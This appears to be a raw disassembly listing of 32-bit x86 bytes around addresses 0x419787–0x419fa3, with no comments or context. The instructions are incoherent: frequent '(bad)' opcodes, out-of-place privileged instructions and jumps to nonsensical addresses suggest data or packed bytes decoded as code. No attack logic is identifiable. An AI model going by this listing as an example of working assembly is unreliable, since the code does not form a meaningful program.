  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
